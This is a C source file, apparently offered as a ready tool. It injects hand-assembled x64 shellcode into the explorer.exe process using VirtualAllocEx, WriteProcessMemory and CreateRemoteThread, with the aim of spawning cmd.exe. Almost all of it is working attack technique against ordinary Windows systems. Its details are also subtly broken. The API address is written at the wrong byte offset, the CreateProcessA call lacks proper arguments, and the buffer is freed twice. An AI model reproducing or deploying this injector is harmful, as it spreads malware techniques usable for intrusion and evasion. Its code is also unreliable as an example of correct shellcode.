#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "kernel32.lib")

// 64-bit shellcode to execute cmd.exe
const unsigned char shellcode[] = {
    0x48, 0x31, 0xc0,                    // xor rax, rax
    0x48, 0x83, 0xec, 0x68,              // sub rsp, 0x68
    0x48, 0x8d, 0x54, 0x24, 0x10,        // lea rdx, [rsp+0x10]
    0x48, 0x89, 0xd1,                    // mov rcx, rdx
    0x48, 0xb8, 0x63, 0x6d, 0x64, 0x2e, // mov rax, "cmd.exe"
    0x65, 0x78, 0x65, 0x00,
    0x48, 0x89, 0x02,                    // mov [rdx], rax
    0x48, 0x31, 0xc0,                    // xor rax, rax
    0x48, 0x89, 0x44, 0x24, 0x18,        // mov [rsp+0x18], rax
    0x48, 0x89, 0x44, 0x24, 0x20,        // mov [rsp+0x20], rax
    0x48, 0x89, 0x44, 0x24, 0x28,        // mov [rsp+0x28], rax
    0x48, 0x89, 0x44, 0x24, 0x30,        // mov [rsp+0x30], rax
    0x48, 0x89, 0x44, 0x24, 0x38,        // mov [rsp+0x38], rax
    0x48, 0x89, 0x44, 0x24, 0x40,        // mov [rsp+0x40], rax
    0x48, 0x89, 0x44, 0x24, 0x48,        // mov [rsp+0x48], rax
    0x48, 0x89, 0x44, 0x24, 0x50,        // mov [rsp+0x50], rax
    0x48, 0xc7, 0x44, 0x24, 0x58, 0x01,  // mov qword ptr [rsp+0x58], 0x1
    0x00, 0x00, 0x00,
    0x48, 0x89, 0x44, 0x24, 0x60,        // mov [rsp+0x60], rax
    0x48, 0xb8,                          // mov rax, CreateProcessA address (placeholder)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xff, 0xd0,                         // call rax
    0x48, 0x83, 0xc4, 0x68,             // add rsp, 0x68
    0xc3                                // ret
};

// Function to get the address of CreateProcessA
LPVOID GetCreateProcessAddress() {
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!hKernel32) {
        hKernel32 = LoadLibraryW(L"kernel32.dll");
        if (!hKernel32) return NULL;
    }
    return GetProcAddress(hKernel32, "CreateProcessA");
}

DWORD WINAPI InjectShellCode(LPVOID lpParameter)
{
    HANDLE hSnapshot = NULL;
    HANDLE hProcess = NULL;
    PROCESSENTRY32 pe32 = { sizeof(pe32) };
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    SIZE_T bytesWritten = 0;
    LPVOID remoteMemory = NULL;
    unsigned char* shellcode_with_api;

    // Get CreateProcessA address
    LPVOID createProcessAddr = GetCreateProcessAddress();
    if (!createProcessAddr) {
        printf("Failed to get CreateProcessA address\n");
        return 1;
    }

    // Create shellcode buffer with proper API address
    shellcode_with_api = (unsigned char*)malloc(sizeof(shellcode));
    memcpy(shellcode_with_api, shellcode, sizeof(shellcode));
    memcpy(shellcode_with_api + 82, &createProcessAddr, sizeof(LPVOID));

    __try {
        hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            printf("Failed to create snapshot: %lu\n", GetLastError());
            return 1;
        }

        if (!Process32First(hSnapshot, &pe32)) {
            printf("Process32First failed: %lu\n", GetLastError());
            return 1;
        }

        do {
            if (_wcsicmp(pe32.szExeFile, L"explorer.exe") == 0) {
                hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
                                     PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
                                     FALSE, 
                                     pe32.th32ProcessID);
                if (!hProcess) {
                    printf("Failed to open process %lu: %lu\n", pe32.th32ProcessID, GetLastError());
                    continue;
                }

                remoteMemory = VirtualAllocEx(hProcess, 
                                            NULL, 
                                            sizeof(shellcode), 
                                            MEM_COMMIT | MEM_RESERVE, 
                                            PAGE_EXECUTE_READWRITE);
                if (!remoteMemory) {
                    printf("VirtualAllocEx failed: %lu\n", GetLastError());
                    CloseHandle(hProcess);
                    continue;
                }

                if (!WriteProcessMemory(hProcess, 
                                      remoteMemory, 
                                      shellcode_with_api, 
                                      sizeof(shellcode), 
                                      &bytesWritten)) {
                    printf("WriteProcessMemory failed: %lu\n", GetLastError());
                    VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
                    CloseHandle(hProcess);
                    continue;
                }

                HANDLE hThread = CreateRemoteThread(hProcess, 
                                                  NULL, 
                                                  0, 
                                                  (LPTHREAD_START_ROUTINE)remoteMemory, 
                                                  NULL, 
                                                  0, 
                                                  NULL);
                if (!hThread) {
                    printf("CreateRemoteThread failed: %lu\n", GetLastError());
                    VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
                    CloseHandle(hProcess);
                    continue;
                }

                WaitForSingleObject(hThread, INFINITE);
                
                // Cleanup
                CloseHandle(hThread);
                VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
                CloseHandle(hProcess);
                free(shellcode_with_api);
                
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    __finally {
        if (hSnapshot != INVALID_HANDLE_VALUE)
            CloseHandle(hSnapshot);
    }

    free(shellcode_with_api);
    return 0;
}

int main() {
    printf("Made By SleepTheGod\n");
    HANDLE hThread = CreateThread(NULL, 0, InjectShellCode, NULL, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }
    return 0;
}
